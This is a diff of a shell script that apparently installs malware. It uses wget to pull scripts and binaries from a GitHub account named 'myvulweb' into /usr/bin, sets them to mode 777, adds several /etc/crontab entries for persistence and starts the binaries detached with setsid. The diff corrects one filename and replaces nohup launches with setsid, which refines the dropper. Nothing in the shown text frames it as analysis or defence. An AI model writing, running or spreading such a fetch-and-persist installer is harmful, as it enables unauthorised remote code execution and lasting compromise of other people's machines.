@@ -4,7 +4,7 @@ wget https://raw.githubusercontent.com/myvulweb/mysh/master/soexec.sh -O /usr/bi
 wget https://raw.githubusercontent.com/myvulweb/mysh/master/bashd.sh -O /usr/bin/bashd.sh
 chmod 777 /usr/bin/libhost.sh
 chmod 777 /usr/bin/soexec.sh
-chmod 777 /usr/bin/bashexec.sh
+chmod 777 /usr/bin/bashd.sh
 
 wget https://github.com/myvulweb/fabu/raw/master/libhost -O /usr/bin/libhost 
 chmod 777 /usr/bin/libhost
@@ -21,6 +21,6 @@ echo '* */24 * * * /usr/bin/soexec.sh'>>/etc/crontab
 echo '* */0 * * * /usr/bin/bashd'>>/etc/crontab
 echo '* */8 * * * /usr/bin/bashd.sh'>>/etc/crontab
 
-nohup libhost &
-nohup soexec &
+setsid libhost
+setsid soexec
  
